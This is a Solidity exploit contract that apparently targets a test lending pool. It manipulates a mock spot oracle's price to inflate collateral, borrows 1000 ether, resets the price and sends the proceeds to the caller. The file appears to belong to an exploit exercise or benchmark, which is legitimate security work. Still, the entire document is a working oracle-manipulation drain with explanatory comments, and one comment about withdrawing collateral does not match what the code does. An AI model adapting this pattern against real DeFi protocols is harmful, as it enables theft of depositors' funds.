import {OracleLendingPool} from "../src/OracleLendingPool.sol";
import {MockSpotOracle} from "../src/OracleLendingPool.sol";

contract ExploitModule {
    OracleLendingPool public targetContract;

    constructor(address _target) payable {
        targetContract = OracleLendingPool(payable(_target));
    }

    function runExploit() external payable {
        // Deposit collateral into the pool
        targetContract.depositCollateral{value: 1 ether}();

        // Manipulate the oracle price to inflate our collateral value
        // We can do this because the oracle is a mock spot oracle
        // which means we can set the price to anything we want
        // Let's set the price to 1000 ETH per token
        MockSpotOracle oracle = MockSpotOracle(address(targetContract.oracle()));
        oracle.setPrice(1000 * 1e18);

        // Now we can borrow way more than we should be able to
        // Because the pool thinks our collateral is worth 1000 ETH per token
        // But it's actually only worth 1 ETH per token
        targetContract.borrow(1000 ether);

        // Reset the oracle price back to normal
        oracle.setPrice(1 ether);

        // Withdraw our collateral
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        // Reentrancy / callback handling if applicable
    }
}
